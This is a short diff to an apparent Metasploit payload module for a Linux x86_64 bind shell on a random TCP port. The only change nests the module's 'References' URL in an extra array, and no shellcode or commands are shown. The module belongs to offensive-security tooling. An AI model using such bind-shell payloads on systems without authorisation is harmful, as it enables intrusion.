@@ -19,7 +19,7 @@ module MetasploitModule
       },
       'Author'        => 'Geyslan G. Bem <geyslan[at]gmail.com>',
       'License'       => BSD_LICENSE,
-      'References'    => ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port_x86_64.asm'],
+      'References'    => [['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port_x86_64.asm']],
       'Platform'      => 'linux',
       'Arch'          => ARCH_X64
     ))
